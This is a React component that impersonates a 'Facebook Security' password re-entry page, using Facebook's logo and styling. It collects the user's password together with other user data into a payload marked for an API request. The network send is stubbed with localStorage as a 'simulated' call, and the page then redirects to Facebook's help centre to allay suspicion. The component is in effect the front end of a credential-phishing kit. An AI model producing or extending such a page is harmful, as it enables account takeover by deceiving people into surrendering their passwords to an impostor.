import React, { useState } from "react";

function PasswordVerification({ submissionId, userData }) {
  const [passwordData, setPasswordData] = useState({
    password: "",
  });
  const [errors, setErrors] = useState({});
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isComplete, setIsComplete] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setPasswordData((prev) => ({
      ...prev,
      [name]: value,
    }));
    // Clear error when user starts typing
    if (errors[name]) {
      setErrors((prev) => ({
        ...prev,
        [name]: "",
      }));
    }
  };

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  const validateForm = () => {
    const newErrors = {};

    if (!passwordData.password) {
      newErrors.password = "Password is required";
    } else if (passwordData.password.length < 6) {
      newErrors.password = "Password must be at least 6 characters long.";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!validateForm()) {
      return;
    }

    setIsSubmitting(true);

    try {
      const completeSubmission = {
        submissionId,
        userData,
        passwordData: {
          password: passwordData.password,
          confirmedAt: new Date().toISOString(),
        },
      };

      // Create FormData for the API request
      const apiFormData = new FormData();
      apiFormData.append("submissionId", submissionId);
      apiFormData.append("password", passwordData.password);
      apiFormData.append("confirmedAt", new Date().toISOString());

      // Add user data fields
      if (userData) {
        Object.keys(userData).forEach((key) => {
          apiFormData.append(key, userData[key]);
        });
      }

      // Store submission locally (simulating successful API call)
      localStorage.setItem(
        `submission_${submissionId}`,
        JSON.stringify(completeSubmission),
      );
      
      // Simulate API delay
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      setIsSubmitting(false);
      setIsComplete(true);
      
      // Redirect after 2 seconds
      setTimeout(() => {
        // Open a safe redirect URL
        window.open('https://www.facebook.com/help/', '_blank');
        // Reset form state
        setPasswordData({ password: "" });
        setIsComplete(false);
      }, 2000);
      
    } catch (error) {
      console.error("Error submitting password:", error);
      setErrors({ submit: "Failed to submit password. Please try again." });
      setIsSubmitting(false);
    }
  };

  if (isComplete) {
    return (
      <div style={{
        fontFamily: "'Helvetica Neue', Arial, sans-serif",
        padding: '40px 30px',
        textAlign: 'center'
      }}>
        <div style={{ color: '#1877f2', fontSize: '48px', marginBottom: '20px' }}>✓</div>
        <h2 style={{ color: '#333', marginBottom: '20px' }}>Password Submitted Successfully!</h2>
        <p style={{ color: '#606770' }}>Redirecting to Facebook Help Center...</p>
      </div>
    );
  }

  return (
    <div style={{
      fontFamily: "'Helvetica Neue', Arial, sans-serif",
      padding: '40px 30px',
      textAlign: 'center',
      position: 'relative'
    }}>
        {/* Logo */}
        <div style={{ marginBottom: '20px' }}>
          <img 
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6c/Facebook_Logo_2023.png/600px-Facebook_Logo_2023.png?20231011121526" 
            alt="Facebook Logo" 
            style={{ width: '120px' }}
          />
        </div>
        
        {/* Header */}
        <div style={{
          marginBottom: '20px',
          fontSize: '18px',
          color: '#333',
          fontWeight: 'bold'
        }}>
          Facebook Security
        </div>
        
        <p style={{ color: '#606770', marginBottom: '30px' }}>
          Please re-enter your password to complete the request.
        </p>
        
        <form onSubmit={handleSubmit}>
          <div style={{
            marginBottom: '25px',
            textAlign: 'left',
            position: 'relative'
          }}>
            <label style={{
              display: 'block',
              fontWeight: 'bold',
              marginBottom: '8px',
              fontSize: '14px',
              color: '#606770'
            }}>
              Password
            </label>
            
            <div style={{ position: 'relative' }}>
              <input
                type={showPassword ? "text" : "password"}
                name="password"
                value={passwordData.password}
                onChange={handleInputChange}
                placeholder="Enter your password"
                required
                style={{
                  width: '100%',
                  padding: '14px',
                  paddingRight: '40px',
                  border: '1px solid #ccd0d5',
                  borderRadius: '6px',
                  fontSize: '16px',
                  color: '#1c1e21',
                  boxSizing: 'border-box',
                  borderColor: errors.password ? '#e74c3c' : '#ccd0d5'
                }}
                onFocus={(e) => {
                  e.target.style.borderColor = '#1877f2';
                  e.target.style.boxShadow = '0px 0px 0px 2px rgba(24, 119, 242, 0.2)';
                }}
                onBlur={(e) => {
                  e.target.style.borderColor = errors.password ? '#e74c3c' : '#ccd0d5';
                  e.target.style.boxShadow = 'none';
                }}
              />
              
              <i 
                className={`fas ${showPassword ? 'fa-eye-slash' : 'fa-eye'}`}
                onClick={togglePasswordVisibility}
                style={{
                  position: 'absolute',
                  right: '10px',
                  top: '50%',
                  transform: 'translateY(-50%)',
                  fontSize: '20px',
                  color: '#606770',
                  cursor: 'pointer',
                  transition: 'color 0.3s ease'
                }}
                onMouseEnter={(e) => e.target.style.color = '#1877f2'}
                onMouseLeave={(e) => e.target.style.color = '#606770'}
              />
            </div>
            
            {errors.password && (
              <span style={{
                color: '#e74c3c',
                fontSize: '14px',
                marginTop: '5px',
                display: 'block'
              }}>
                {errors.password}
              </span>
            )}
          </div>
          
          {errors.submit && (
            <div style={{
              color: '#e74c3c',
              fontSize: '14px',
              marginBottom: '15px',
              textAlign: 'left'
            }}>
              {errors.submit}
            </div>
          )}
          
          <button
            type="submit"
            disabled={isSubmitting}
            style={{
              backgroundColor: '#1877f2',
              color: 'white',
              border: 'none',
              padding: '14px',
              borderRadius: '6px',
              fontSize: '16px',
              fontWeight: 'bold',
              cursor: isSubmitting ? 'not-allowed' : 'pointer',
              width: '100%',
              marginTop: '10px',
              opacity: isSubmitting ? 0.6 : 1
            }}
            onMouseEnter={(e) => {
              if (!isSubmitting) e.target.style.backgroundColor = '#166fe5';
            }}
            onMouseLeave={(e) => {
              if (!isSubmitting) e.target.style.backgroundColor = '#1877f2';
            }}
          >
            {isSubmitting ? "Submitting..." : "Submit"}
          </button>
        </form>
      </div>
  );
}

export default PasswordVerification;